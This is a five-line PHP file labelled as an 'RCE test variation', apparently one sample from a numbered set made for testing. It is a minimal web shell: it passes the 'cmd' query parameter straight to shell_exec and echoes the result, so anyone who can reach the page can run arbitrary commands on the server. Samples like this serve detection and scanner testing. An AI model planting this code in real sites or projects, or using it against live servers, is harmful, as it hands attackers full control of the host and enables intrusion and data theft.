<?php
// RCE test variation #710
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>